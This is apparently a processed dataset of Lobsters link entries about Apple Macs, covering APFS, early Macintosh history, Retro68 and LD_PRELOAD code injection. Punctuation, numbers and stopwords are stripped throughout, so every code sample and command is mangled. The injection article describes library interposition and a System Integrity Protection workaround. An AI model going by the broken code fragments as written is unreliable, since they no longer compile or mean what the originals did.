system log file unfortunately journaling creates performance overhead log file always written read apfs replaces new copyonwrite metadata scheme much efficient apfs security apple concerned user privacy protection user privacy occasionally put apple loggerhead government individual want data apple taking privacy seriously apfs thanks much sophisticated encryption option apple current encryption scheme called filevault filevault whole disk encryption turn mac encrypts hard drive encrypted data intent purpose unrecognizable unless enter password key unlock problem filevault either whole volume unlocked data potentially vulnerable apfs still support full disk encryption also encrypt individual file metadata single multikey support provides additional security sensitive data backup company one feature apfs particularly interested support snapshot snapshot pretty standard feature enterprise backup seen yet mac snapshot contains pointer data stored disk providing fast access data stored disk snapshot contains pointer actual data compact accessing fast get apfs upgraded io later iphone ipad already made switch nothing mac user best waiting apfs support mac still provisional mainly purview developer coming soon apple promise sort seamless conversion iphone ipad customer time right make sure back mac making essential change iphone ipad yet installed need help head computer backup guide tip lot hood apfs give broad overview excited hope apfs hood enhancement io significant effect apple gear work today pave way come future
427,Lobsters,mac,Apple macOS,The Hungarian Naming Convention,http://www.folklore.org/StoryView.py?project=Macintosh&sortOrder=Sort+by+Date&story=Hungarian.txt&topic=Software+Design,hungarian naming convention,,macintosh used motorola microprocessor predecessor lisa wanted leverage much code written lisa could lisa code written pascal programming language since macintosh much tighter memory constraint needed write systemoriented code efficient way possible using native language processor assembly language even could still use lisa code hand translating pascal assembly language directly incorporated quickdraw bill atkinson amazing bitmapped graphic package since already written mostly assembly language also used lisa window menu manager recoded assembly language bill original pascal reducing code size factor two bill lovely pascal code model clarity relatively easy accomplish mac lacked memory mapping hardware prevalent larger system needed way relocate memory software minimize fragmentation block got allocated freed lisa word processor team developed memory manager relocatable block accessing memory block indirectly handle block could moved necessary reduce fragmentation decided use macintosh recoding pascal assembly language primary author lisa word processor memory manager tom malloy original member lisa team apple first recruit xerox parc tom worked bravo word processor parc leadership charles simonyi used many technique learned lisa code even though bud tribble leave mac team december order retain standing mdphd program university washington decided could still initial implementation memory manager planning along hoping finish quickly moved back seattle class started obtained copy memory manager source tom malloy shock began read code memory manager source lacked comment disappointing biggest obstacle name selected variable procedure vowel gone every identifier seemed unpronounceable jumble consonant making much harder understand code since variable meaning far obvious wondered code written odd fashion happened vowel turn tom malloy greatly influenced mentor xerox strongwilled eccentric programmer named charles simonyi charles quite character holding many strong opinion best way create software developing advocating number distinctive coding technique tom brought lisa team one controversial technique particular method naming identifier used program mandating beginning variable name determined type variable however compiler early eighty restricted length variable name usually character since beginning name include type nt enough character left use meaningful name describing purpose variable charles sort workaround leave vowel name lack vowel made program look like written inscrutable foreign language since charles simonyi born raised hungary defecting west age coding style came known hungarian tom malloy memory manager outstanding specimen hungarian pascal code identifier looking like chosen superman enemy dimension mr mxyzptlk bud decided would error prone try translate hungarian memory manager directly assembly language first made pas strip type prefix restore vowel identifier name could read code without getting headache adding lot block comment explain purpose various subcomponents week later bud came back attend one first retreat brought nicely coded efficient assembly language version memory manager complete easy read variable name immediately became cornerstone rapidly evolving macintosh operating system
428,Lobsters,mac,Apple macOS,Douglas Adams on Mac OS X,"http://www.douglasadams.com/cgi-bin/mboard/info/dnathread.cgi?2922,1",douglas adam mac o x,dian fossey gorilla fund save rhino prev next subject mac o x prev next back thread list,donate dian fossey gorilla fund save rhino prev next subject mac o x posted douglas adam going wait till summer install succumbed installed last week take little getting used old habit hard reform quite finished software ever much software run betabut think brilliant fallen completely love promise come people start developing cocoa awesome prev next back thread list
430,Lobsters,mac,Apple macOS,Darwin 0.1 + Rhapsody DR 2 booted!,https://virtuallyfun.superglobalmegacorp.com/2017/04/22/darwin-0-1-rhapsody-dr-2-booted/,darwin rhapsody dr booted,yesterday ncommander nextcomputersorg forum back may yellow box back day sure looked promising source code darwin secretive plan b came step iso image instruction qemu imageexe multiuser bootable image,following yesterday go rhapsody booting finally got running inspiration ncommander nextcomputersorg forum darwin kernel infact build able went ahead took stab trying start openstep tried something close could target rhapsody back day next apple merger hope opentstep could become next great o apple macintosh since next o running thing rotten somewhat time passed however first viable platform would course back feeling increased pressure hardware space next forced start porting away black based hardware opportunity get software running different platform sadly nrw aka next risc workstation development dual processor killed along hardware project end matter much processor early vibrant future back transitional time o x developer version o seeded required intel machine openstep ported powerpc machine apple selling may last public version intel processor released however two interesting thing happened along way would become o x server first apple gave yellow box portable api satisfy gpl requirement release change source code apple would go one release source code many internal system utility along kernel known darwin big deal many u cost getting source code unix incredibly prohibitive o like linux netbsdopenbsdfreebsd picking steam openstep awaken cryonic hibernation promise free open software pretty great back day sure looked promising obviously thing work everyone hoped apple either straight ignored anyone outside hired people showed promise made sign nda basically never heard recently recovered source code darwin corresponds release powerpc o x server however found darwin still built maintained intel secretive plan b case something went wrong powerpc platform portable saved next would save apple little background lot stumbling around dark came step permitted build darwin kernel however perfect biggest glaring issue due software recovered layer known driverkit turn another later release darwin release thing surviving driver kit build cleanly order get build break mach pci bus mean yes pci device load runtime boottime sald lot fighting able produce system could boot single user multiuser mode although unable load driver networking ui fit boredrom built bunch command line tool darwin library went see driverkit problem finding reason kernbus undefined even attempt helping method unknown stumbled onto fact compilation generate new header header correct interface driverkit call kernbus able quickly rebuild driverkit relink kernel could load driver thrilled much something aggressive made dump install target restored onto image dev vm much amazement booted graphical login pci working correctly darwin kind thing casual user install vm ought able use iso image follow instruction o o x kernel running biggest difference noticed newer kernel use ram nice bump prior limit obviously lot work done nice find source ide block controller modify work massive disk today along filesystem code handle partition larger maybe possible port driverkit xnu get thing like existing driver smp massive filesystems etc great see going right way fan qemu imageexe run darwin single user mode edit people still hitting multiuser bootable image keep updating source forge page
432,Lobsters,mac,Apple macOS,The Sprong [Operator],http://textmail.net/sprong/sprong.html,sprong operator,get confused using handle structs c miss day used pascal wish c way dereference sequence handle structs lefttoright without nested bracket need sprong sprong sprong good b b b b c b c b c b c b b b nt look bit weird b c called sprong get strange code generated use sprong b b sprong prince new name,get confused using handle structs c miss day used pascal wish c way dereference sequence handle structs lefttoright without nested bracket need sprong sprong sprong useful trick macintosh c programmer block punctuation look like sprong good pointer struct c let use b b people use b keep punctuation one block nest easily b c always preferred b c lefttoright dereferencing win every time however macintosh normally us handle pointer forced use notation thing like b c b c mac programmer using notation best thing say get used year two solution use useful chunk punctuation called sprong look like directly equivalent pascal useful dealing handle structs c treat array pointer b b b cool easier dereference left right nest load bracket star prefer short maindepth getmaindevice gdpmap pixelsize short maindepth getmaindevice gdpmap pixelsize nt look bit weird first time see b c look bit strange got initial shock really big improvement set keyboard macro type type identifier hitting sprong key inbetween find readable alternative le clean generates code le familiar also consider alternative think back first time saw nested bracket star notation many try took get code right basically suck end load nested bracket place nt readable try like called sprong liked sound bit like pling people use exclamation mark sprong look bit springy ronny wichers schreur tell mean jump dutch maf mean bit weather belgian language apparently get strange code generated use sprong reason b give different object code b dereference dereference sprong prince new name like sprong faq maf vosburgh maf goatdemoncouk
433,Lobsters,mac,Apple macOS,APFS filesystem format,https://blog.cugu.eu/post/apfs/,apfs filesystem format,twitter notice update update content overview block header apfsksy kaitai ide create parser general information litteendian nanosecond copyonwrite structure checksum apple doc paper john kodis container superblock node spacemanager allocation info file unknown btree checkpoint volume superblock allocation file,apr started reverse engineer apfs want share found far send feedback idea post via twitter notice created test image macos sierra result guess reverse engineering work progress also newer version apfs might change structure information neither complete proven correct update added section checksum update add apfsksy respository content overview apfs structured single container contain multiple apfs volume container need mb contain one volume contain two volume following image show overview apfs structure element structure except allocation file start byte block header contains general information block afterwards body structure following following type exist container superblock node spacemanager allocation info file unknown btree checkpoint volume superblock structure described detail detailed version apfs structure available kaitai struct file apfsksy use examine apfs dump kaitai ide create parser various language ksy file must considered experimental general information filesystem us litteendian value storing information timestamps nanosecond second starting utc unix epoch current timestamp around standard block size seems byte per block apfs copyonwrite filesystem block copied change applied history unoverwritten file filesystem structure exists might result huge amount forensic artefact structure filesystem structure apfs start block header header start checksum whole block information header include copyonwrite version block block id block type possizetypeid checksum according apple doc fletcher checksum algorithm used apple us variant algorithm described paper john kodis following algorithm show procedure input block without first byte func createchecksum data byte var modvalue len data data modvalue modvalue modvalue modvalue modvalue modvalue return nice feature algorithm check block apfs following algorithm get null result note input case whole block including checksum func checkchecksum data byte var modvalue len data data modvalue modvalue return container superblock container superblock entry point filesystem structure container flexible volume allocation need handled container level container superblock contains information blocksize number block pointer spacemanager task additionally block id volume stored superblock map block id block offset pointer block map btree stored btree contains entry volume id offset possizetypeid nxsb repeat apfscount time node node flexible container used storing different kind entry part btree exist node either contain flexible fixed sized entry node start list pointer entry key entry record way entry node contains entry header beginning node entry key middle node entry record end node possizetypeid repeat entrycount time spacemanager spacemanager sometimes called spaceman used manage allocated block apfs container number free block pointer allocation info file stored possizetypeid allocation info file allocation info file work missing header allocation file allocation file length version offset allocation file stored possizetypeid unknown structure type quite empty seems related spacemanager occurs adjacent purpose unknown btree btrees manage multiple node contain offset root node possizetypeid checkpoint checkpoint structure exists every container superblock clue good volume superblock volume superblock exists volume filesystem contains name volume id timestamp similarly container superblock contains pointer block map map block id bock offset additionally pointer root directory stored node stored volume superblock possizetypeid apsb ascii name allocation file allocation file simple bitmap block header therefore type id
434,Lobsters,mac,Apple macOS,A Software Developer’s Mac Pro,https://carpeaqua.com/2017/04/09/a-software-developers-mac-pro/,software developer mac pro,transcript developer craig federighi mac pro tower boredom podcasters cheese grater cpu tocking swift performance issue gpu storage memory ethernet port connection expansion everything else next wifi router mac back justin williams,according transcript chat apple different type pro user considering video editor music creator graphic designer scientist engineer architect developer developer say craig federighi think use xcode downloads metric possible software developer actually largest pro audience growing quickly fantastic sound like download lot xcode build important speak five type user need pretty good idea want io developer us mac every day anyone cupertino asking say dream mac let assume apple going ship new mac pro yes coy semantics available ship year thought exercise desk around wwdc tower boredom despite fever dream podcasters phil schiller meant said new mac pro would modular system aspiration desire stackable modular computer add external gpu part desire need tower connects external monitor make look like cheese grater want spend time designing something modern attractive get say size like something along size power mac cheese grater design nice also chore lug around time needed move rearrange desk think safe assume optical drive required computer hopefully offer space weight saving need microatx architecture atx fine maybe make weigh pound developer bodybuilder cpu know intel trouble recent year taken tocking ticking also see amd viable alternative cpu ryzen interesting rather kabylake cannonlake xeons term speed reality hamstrung cpu performance year need faster cpu core trash mac pro got right imac max going want least mac pro anything seems overkill personally appreciate others might need use core parallelizing compilation hope speeding well assuming swift performance issue resolved ship thing gpu know backed thermal corner trash past forgiven default using boring old pcie video card nvidia amd gtx eye upgrading pc desktop gladly take one mac pro need multiple gpus personally software developer game work want ensure best gpu get buy ensure macos performs well year stuttering toggle mission control speaking game play mac dream mac ever bestofclass gaming platform long gone linux desktop better chance succeeding getting overwatch mac dayanddate pc console storage use ssds point save time machine need fastest write speed offer like ability mirror boot drive using raid redundancy survive need though room single drive going give modular system going want move time machine backup internal maybe even separate drive different virtual machine operating system macos development right remember time boot old version o test debug release one drive fail need able replace quickly without sending memphis repair hub memory know love thing please lot get ram laptop world go going buy new tower expect last several year going need least ram take possible though prefer think paging throwing money problem using ram necessarily need building app xcode add virtual machine run parallel testing docker container dozen tab keep open given time add slack also eats memory know allowed use apple real world memory hog ethernet adapter may fine including ethernet macbook pro keep desktop connected ethernet time need fastest possible speed afforded internet connection downloading uploading thing like xcode release build testflight bit byte see fit current mac pro two use one lose sleep give two please include wifi thing like handoff airdrop take away ethernet port primary internet connection rely imac would rely next mac pro well port connection think safe assume developer mac pro would following connection like usba port two connect wired clicky keyboard understand want include add adapter never think port include need lot tend keep iphone ipad apple watch connected desktop time deploying via xcode hope without space constraint laptop every port sort bus speed want think upperleft usbc port faster lowerright one expansion modern apple defined locked system become fine imac macbook pro need ability swap noncore part future upgrading bigger faster ssd technology improves adding ram afford max purchase replacing adding new gpu card want support via applecare fine negate ability extend improve desktop tower however everything else apple computer known quiet default fine fan cranking processing heavy load default state minimal noise know new apple pro display coming likely buy throw usbc port back run long cable tower ground desk maybe test next wifi router shipping using imac last year seemed like better option meeting need wanting retina display good enough performance new mac pro potential send back apple niche hardware class fact funneling money away new jesus computer excited future mac since last time apple said mac back justin williams two sentence bio many like one mine
435,Lobsters,mac,Apple macOS,"""This will only hurt for a moment"": code injection on Linux and macOS with LD_PRELOAD",https://www.datawire.io/code-injection-on-linux-and-macos/,hurt moment code injection linux macos ldpreload,hurt moment code injection linux macos ldpreload code injection fun profit faketime look like root pretending changed root filesystem telepresence kubernetes torsocks ipifyorg process island system call shared library injecting shared library caveat limitation function static binary go security problem reading wrote excellent intro ldlinux dyld telepresence local development environment remote kubernetes cluster,published apr hurt moment code injection linux macos ldpreloadhave ever wanted make program behave differently without modifying source code linux macos operating system formerly known o x ldpreload dyldinsertlibraries mechanism respectively allow override system library call particular process may seem dangerous actually pretty easy quite usefulin post discus might want thishow mechanism worksome limitation mechanism involved impact linux macos limited macoscode injection fun profitwhen run program call shared library kernel using system call overriding call allows override program behavior variety interesting waysfor example program often need check current time wanted change different value could change whole system clock problematic may unexpected sideeffects programsalternatively use faketime override call retrieve current time instead getting real time wrapped process get whatever time choose set copy bindatethu apr edt faketime bindatewed dec est us include making process look like root setting file permission pretending changed root filesystemhere datawire give another example working telepresence program make local process appear remote cluster running kubernetes kubernetes run dns server custom domain name like myservicedefaultsvcclusterlocal internal ip service want ip dns record used local processthere way achieve effect using torsocks override tcp socket connectionsand dns lookup route proxy original purpose torsocks route call tor onion router network give user greater privacy see external ip change run process torsocks send request ipifyorg api return caller ip address see torsocks transparently route http request various tor proxy copy curl http apiipifyorg formatjson get external ip ip torsocks curl http apiipifyorg formatjson get external ip via tor ip host domain name pointer torexitclutterbuckukso program work process islandwhen run program resulting process operate need functionality library kernel library may turn depend library kernel consider simple c program copy include stdioh int main printf hello world return stdioh note later example linux mention difference macos relevantwe compile program statically run resulting binary console gcc static helloc hellostatic chmod x hellostatic hellostatichello world size binary rather large considering copy l lh hellostaticrwxrwxrx itamarst itamarst apr hellostaticthat compiled statically code relies kernel included file watch call kernel aka system call using strace utility dtruss macos copy strace hellostatic devnullexecve hellostatic hellostatic var elided write hello world n exited see printf library call ended calling write system callfrom system call shared librariesmost binary distributed static binary instead library code included binary binary note shared library relies get loaded runtime copy gcc fpic helloc helloshared chmod x helloshared hellosharedhello world l lh hellosharedrwxrwxrx itamarst itamarst apr hellosharedwe gone binary shared library binary relies list using ldd similar identical otool macos copy ldd way linux kernel inject kernel code process memory certain system call run c standard library includes apis like dynamic linker code know load shared library like process memory startupjust like static binary use strace watch system call running shared binary copy strace helloshared devnullexecve helloshared helloshared var elided open ordonlyocloexec elided write hello world n exited notice time binary loaded additional file shared libraryin static binary implementation printf included binary part extra data binaryin shared binary code life use ltrace utility see call copy ltrace helloshared devnulllibcstartmain unfinished put hello world exited status unfinished printf may ask turn generated binary nt using printf actually using put instead compiler decided use put optimization since formatting involved put simpler faster equivalent see put defined implemented binary using nm utility look undefined symbol console nm u hellosharedw gmonstartw itmderegistertmclonetablew itmregistertmclonetablew jvregisterclassesu libcstartmain put shared librariesremember ldlinux load shared library also useful thing particular set ldpreload environment variable load shared library set variable process macos variable called dyldinsertlibraries injected library override function shared library choose call back original version example recall discovered printf implemented using put let override put following shared library copy include dlfcnh dlfcnh typedef int originalputsfunctiontype const char str custom version override libc version int put const char str load original put originalputsfunctiontype originalputs originalputs originalputsfunctiontype dlsym rtldnext put call twice originalputs str return originalputs str compile library use override call put shared binary copy gcc shared fpic doubleputsso doubleputsc ldl ldpreloaddoubleputsso hellosharedhello world hello world ldlinux linker load doubleputsso process call put get routed overridden version torsocks faketime fakechroot work overriding system library call custom version using ldpreload mechanismcaveats limitationscode injection share problem coursewhich function remember compiled program printf got binary put instead broadly library call need wrap order inject code hard predictsome library call multiple variant library call share internal private implementation library none likely designed code injectioneven worse different operating system compiler require wrap different call original example using gcc linux ended using putson o x got binary called printfon linux using clang compiler instead gcc got binary called printfstatic binary gosince ldpreload macos equivalent work using dynamic linker work static binary notice get double print copy ldpreloaddoubleputsso hellostatichello world typically place encounter static binary writing go default go compiler mechanism calling system call directly tends ship static binary want use ldpreload go best bet use gccgo gccbased go compilersecurity problemsfor security reason ldpreload work suid binary ability inject arbitrary code process running another user obvious problemson macos additional problem newer version macos security subsystem called system integrity protection purpose problem prevents injecting code via dyldinsertlibraries macos equivalent ldpreload binary bin sbin usrbin usrsbinluckily easy workaround create new directory copy binary bin sbin usrbin usrsbin directory add start path environment variable binary special directory code injection work fine since copying quite fastfurther readingrafał cieślak wrote excellent intro ldpreload borrowed dlsym code therethe man page ldlinux dyld explain ldpreload dyldinsertlibraries environment variable respectively detailand kubernetes developer check telepresence great way local development environment remote kubernetes cluster
436,Lobsters,mac,Apple macOS,Text-mode menu bar indicators,https://nedbatchelder.com//blog/201704/textmode_menu_bar_indicators.html,textmode menu bar indicator,geektool,recently upgraded mac operating system decided try new feature automatically hiding menu bar give back another sliver vertical space drawback longer time battery life speaker volume indicator available glancei went looking thing figured must exist mac app would display information dock icon already dock clock found dock battery indicator though tried hard cute pictorial tell telling measking around got recommendation geektool let draw panel desktop draw panel output script ball back court could build thingi long ago moved dock left side screen use vertical space stuff left small rectangle desktop visible upper left lower left even maximized window drew panel upper left desktop set run script every five second usrbinenv datetimeimport reimport subprocessdef blockeighths eighth return unicode string block many eighth assert eighth eighth return else return chr eighth def gauge percent return twochar string drawing gauge slice round percent blockeighths min slice blockeighths max slice return datetimedatetimenow print f mn batt subprocesscheckoutput pmset g batt decode splitlines research r batt level mgroup battpercent int level else level discharging batt arrow black downpointing triangleelif charging batt arrow white uppointing triangleelse arrow print level arrow print gauge battpercent box drawing heavy leftvol subprocesscheckoutput osascript e get volume setting decode research r output volume muted w vol level muted mgroups muted true level combining reverse solidus overlay print f level circled latin capital letter v debugging output raw data pushed viewprint f batt print f vol display time date battery level numerically crudely drawn battery gauge whether battery charging discharging volume level btw looking python esoterica littleknown thing going line print f mn finding unicode character represent thing bit challenge find exactly need right tip battery gauge work well enoughgeektool also web page though quick experiment make something useful stuck text mode also seem old fork geektool offer text color could cool started feel bit offthepaththis work great
437,Lobsters,mac,Apple macOS,Early Macintosh Emulation Comes to the Archive,https://blog.archive.org/2017/04/16/early-macintosh-emulation-comes-to-the-archive/,early macintosh emulation come archive,console game arcade machine home computer introduction macintosh located collection complete run macworld magazine deepdive macintosh book compilation system pce james friend marcio,offering inbrowser emulation console game arcade machine range home computer internet archive emulate early model apple macintosh blackandwhite mouse driven computer radically shifted future home computing certainly predecessor computer desktop paradigm introduction macintosh brought mass market year since steadily adapted every major computing platform operating system first set emulated macintosh software located collection curated presentation application game operating system experienced original operating system macintosh family computer interesting combination wellworn convention modern world along choice might seem strange offthemark time machine released however landed new idea hand worldwide audience gained significant fan follower almost immediately story creation operating system macintosh covered many collection archive including complete run macworld magazine deepdive macintosh book program currently presented many case application survived present day various form direct ancestor warning megabyte download compilation system includes large variety software program rather rich recreation macos experience enjoy black white window computer history many people worked hard bring emulation system bear hampa hug created pce original macintosh emulator program experiment work james friend pcejs marcio retroweb ported pce javascript via emscripten provided continued assistance emularity team approached refining emulator work within archive framework much work done daniel brook philel james baicoianu vitorio miliano daniel brook putting multiple week refinement
438,Lobsters,mac,Apple macOS,The new Mac Pro: The audacity to say “Yes” in a design culture of “No”,https://marco.org/2017/04/15/mac-pro-audacity-of-yes,new mac pro audacity say yes design culture,video creator audio creator photographer software developer mac gamers budgetconscious pc builder macos versatility allows io remain lightweight maximum viable product,much modern apple design philosophy relentlessly strip product bare minimum certain area technological progress allows following largely defining modern design fashion nearlyunquestioned devotion minimalism saying easiest path considered good design today something easily accommodated people complain badly absence omit minimalism one aspect one view good design often overused underconsidered misunderstood resulting product surfacelevel appeal actually work well optimized visual design minimalism rather overall realworld every design decision removal omission major tradeoff need carefully considered today design culture often go unquestioned assumed best outcome minimalism axiomatic area often le sometimes le lot went wrong mac pro leading factor led failure expensive predecessor also removing major feature many customer still needed macbook pro problem designed accommodate exactly two gpus relatively low heat output cpuheavy user need second gpu gpuheavy user needed hotterrunning gpus often one really hot one configuration offered either overspecced overpriced underpowered mac pro customer le year release missed desktop retina revolution started imac beaten handily singlethreaded performance cpu generation apple never updated use last factor poor timing could fixed regular update first two simply major design flaw making wrong choice product understand apple went path context led favorite line ever spoken apple keynote right unveiling mac pro wwdc keynote innovate anymore as schiller back job gone long cook lot prove overwhelming press analyst narrative apple innovate anymore samsung king innovation whatever meant turned mean big phone clearly bothered apple almost certainly influenced overly aggressive decision design mac pro mac pro worst place entire apple product lineup drastically remove capability versatility update four year overly aggressive minimalism fails spectacularly clear consensus among customer removed ask mac pro customer need want little overlap video creator need many cpu core possible one two fast gpus support cuttingedge video output resolution like today pcie capture massive amount storage external peripheral bandwidth possible audio creator need fast singlecore cpu performance lowlatency pciethunderbolt interface rocksolid usb bus ecc ram stability reliable silence regardless load many also use optical audio input output would appreciate return linein jack photographer need ton cpu core ton storage lot ram biggest best single display software developer federighi called briefing month possibly largest part apple pro audience need ton cpu core fastest storage possible ton ram ton usb port multiple big display hardly gpu power unless developing game vr case need gpu power possible mac gamers need highspeedlowcorecount cpu best single gaming gpu possible vr hardware support budgetconscious pc builder need many pcstandard component interface possible maximize potential upgrade repair expansion road requirement map pro user seem agree core principle ideal mac pro none include size minimalism internal capacity better component reasonably priced base option offer ability configure best technology market need accommodate wide variety need apple offer may require future upgrade distill requirement single word macos versatility allows io remain lightweight ability rest mac lineup aggressive minimalist forwardlooking depends mac pro cover everyone whose need fit mac pro must catchall high end anytime someone say imac macbook pro something enough solution mac pro try narrow mac pro focus big versatile modular box stop serving need big slice market forcing valuable influential pro user either sacrifice major area need leave mac platform entirely many previousgeneration mac pro tower still use today highly demanded ebay component least seven year old apple made mac pro since addressed owner need need try accommodate arrive capability similar previous mac pro tower modernized new component redesigned remove outdated option like opticaldrive bay easy apple update every year new component become available mac pro went completely wrong direction satisfying narrow subset pro user tight tolerance updated single design single set tradeoff address large set pro user want different thing way serve one product line extremely versatile offer wide variety configuration option minimalist industrialdesign indulgence like mac pro hope apple beyond learned confident enough ability innovation stare minimalist design culture ship maximum viable product top lineup say yes everything throw
439,Lobsters,mac,Apple macOS,Exploring Retro68 GCC-based SDK for 68K Macintosh computers,http://www.toughdev.com/content/2017/03/exploring-retro68-gcc-based-sdk-for-68k-macintoshes/,exploring gccbased sdk macintosh computer,update latest post macintosh programmer workshop think c wolfgang thaller cygwin compiling source github repository cinludes rincludes autoconf startbuildsh dialog helloworld raytracer cmakeliststxt update pcemacplus macintosh emulator code structure dialogr dialogc cmakeliststxt cmakeliststxt cmakeliststxt build disposhandle disposehandle addresmenu appendresmenu code segmentation pragma segment libretrorelocatec pragma segment nvir virus mcafee virus scan macgui sampler kprefsize kminsize macintosh support return relocatec stripaddress sysenvirons supported stripaddress sysenvirons stripaddress libretro libretro libretrocrta libretrocrta mpw object file compatibility serreset serialh opendeskacc interfaceo serreset libretrogluec opendriver pbopensync stripaddress gluec gluec known issue conclusion codelite pcemacplus see also pcemacplus ultimate macintosh emulator,avg rating score vote update development environment together codelite pcemacplus emulator running ubuntu ready download virtualbox image see latest post detail fan vintage apple computer always looking modern way build apps mac directly laptop without resort ancient tool like macintosh programmer workshop think c luckily dream realized came across gccbased crosscompiler seems featurerich easy use spent week exploring various feature article share finding developed wolfgang thaller allows compile existing c code minor modification using gcc modern o run generated binary file mac compiling code create macbinary image bin disk image dsk well mac application package resource fork appl containing compiled executable copied favorite machine testing written c compiled various platform linux mac o even window help cygwin although maccompatible appl application package generated running mac hfshfs compatible volume following section describe step needed compile ubuntu favourite linux distro compiling source first perform git clone github repository next copy cinludes rincludes folder macintosh programmer workshop mpw installation main folder copy mpw download header file mpw install package required using following sudo aptget install cmake libgmpdev libmpfrdev libmpcdev libboostalldev bison autoconf automake texinfo verify package installed successfully particular autoconf package critical missing compiling fail towards end build process may take min even fast computer output may also display cryptic error message could confuse next create folder named parent directory sdk downloaded also inside parent directory create startbuildsh script following content rm rf cd sh take note bash script remove previous build output starting build process execute script prepared wait minute build complete process successful error message end find sample application dialog simple application showing dialog various button helloworld consolebased hello world application raytracer demonstrate use various graphic funtions experience raytracer application may fail build due missing header file problem affect functionality work around issue replacing content raytracer folder helloworld application editing cmakeliststxt keep target name eg raytracer addapplication raytracer helloc console update issue fixed latest release dated april raytracer sample application build properly modification finish building issue try sample apps copying macbinary file bin file favourite machine extract show original executable file following screenshot sample dialog application running pcemacplus macintosh emulator following helloworld sample console application also running pcemacplus app built using libretroconsole library support basic console functionality support developing console application original macintosh design apps supposed guibased also generates hf disk image dsk written floppy disk example using dd facilitate copying compiled application older mac support floppy use macbinary output bin file transfer instead code structure despite based gcc modern compiler c code meant vintage development tool mpw think c compile fine modification take look dialog sample application contains file dialogr text resource file dialogc main application file cmakeliststxt build rule compile application cmakeliststxt file contains following cmakeminimumrequired version addapplication dialog dialogc dialogr adding c file application requires modifying make file include new file obviously necessary include header file h make file however build application using cmakeliststxt file run following bash script rm rf build mkdir build cd build cmake make output created build folder new programming dialogr file text resource file defines various gui element using clike syntax resource dlog dboxproc visible nogoaway centermainscreen us rez implementation apple rez resource compiler read r file compiles binary resource file whose name look like dialogrrsrc resource file bundled together binary output gcc create final mac application design sample code mpw even think c compile fine changing cmakeliststxt include required source file take note change various method name mpw mpw may result need modify part code example disposhandle renamed disposehandle addresmenu renamed appendresmenu use following code snippet assist change define resetalrtstage resetalertstage define setditem setdialogitem define getditem getdialogitem define getitem getmenuitemtext define disposhandle disposehandle define addresmenu appendresmenu define disposptr disposeptr define resrvmem reservemem text resource format also changed resulting cryptic error message example incorrect number parameter using older resource file fix error check various resource header file rincludes folder well sample application mpw find expected format code segmentation original mpw compiler used offset made us pragma segment organize code different segment name need configured linker phase loadedunloaded dynamically runtime respective code needed result complicated code cause generated application contain multiple segment code resource smaller following code resource eudora displayed resedit hand us gcc absolute address need stick faithfully part mac architecture simply place code single segment us custom code make address point right place code loaded code responsible found libretrorelocatec following code resource dialog application compiled using two segment code simply put code mpw architecture segmenting via pragma segment longer needed simply ignored gcc side note code resource extra segment id like following screenshot mac o installation likely infected nvir virus use virus scanner software mcafee virus scan clean infection case virus could come one downloads macgui application created using two code segment id come trap new programmer happily using build application adding code suddenly following error message appeared immediately launching application error message read application unexpectedly quit application memory system system changed application unexpectedly quit error type occurred system error type segment loader error according perhaps indicated thing memory loading application clearly memory issue gone wrong root cause simply hardcoded resource value declared memory requirement application value used finder allocate amount memory required application case sampler text resource file section following code resource size kprefsize kminsize kprefsize kminsize declared header file follows define kminsize define kprefsize value mean application need minimum prefers least memory work properly code added without value changed app longer work properly finder allocate enough memory setting value least fixed issue macintosh support testing generated binary macintosh se running system tried run compiled app macintosh mac o finder received message system error occurred id indicating app attempted access nonexistent rom routine something like debugging seemed error happened even app contained single return main method problem must somewhere inside bundled code called even execution reached main method exactly troubleshooting author helpful provided lot good information issue seemed method relocatec particular call made stripaddress sysenvirons supported older rom define displacement displacement stripaddress displacement sysenvrec env envprocessor sysenvirons env envprocessor flushcodecache method stripaddress used convert gcc offset equivalent whereas method sysenvirons used check code cache need flushed none method supported rom used macintosh new programming took almost week find solution read word value memory position see whether rom call two method rom rom following used alternative stripaddress taking last bit address define stripaddress x ptr unsigned long x amp debugging process order recompile libretro modified file without compile entire sdk used following script make c rm cp script force rebuild sample application rebuild libretro related library output file libretrocrta copied correct folder expected toolchain needed otherwise build continue use old libretrocrta library file building submitted code change author integrated latest release dated april apps compiled using work fine macintosh even macintosh provided make function call compatible old rom issue remains console apps built using work compiled app size bigger floppy disk almost due added library size even fail run enough memory according author culprit libstdc huge implementation locale get pulled time new version gcc even though code never really used unfortunately fixing problem seems nontrivial mpw object file compatibility one experiment received linker error moment started use serreset function found serialh initialize serial port linker error also happens opendeskacc used one mpw sample application mean function declared header file object file used link process resulting linker error checked original mpw disk saw lot object file library folder among interfaceo file contained serreset function using library also contained lot method commonly used application clearly use library could sample application compile fine contacted author answer provided reuse mpw file format different gcc standard instead simply rewrite method libretrogluec example opendriver method rewritten using pbopensync following code pascal oserr opendriver name short drvrrefnum paramblockrec pb oserr err memset pb sizeof pb pbioparamionameptr stringptr name err pbopensync pb drvrrefnum pbioparamiorefnum return err function stripaddress need rewritten gluec since invoke rom function directly externapi ptr stripaddress void theaddress onewordinline unfortunately implementation many important api method eg file manager device manager quickdraw call declared onewordinline twowordinline work unless gluec modified include method mpw library file converted format accepted gcc included linker phase attempting use unsupported method result linker error known issue solution yet conclusion despite limitation still like use laptop running ubuntu compile mac apps also together codelite pcemacplus custom configuration make good development environment basic bash script compile project using run pcemacplus comfortably edit code using codelite even autocompletion supported well interested preparing virtualbox ubuntu image codelite pcemacplus necessary component allowing develop apps modern way stay tuned see also pcemacplus ultimate macintosh emulator avg rating score vote
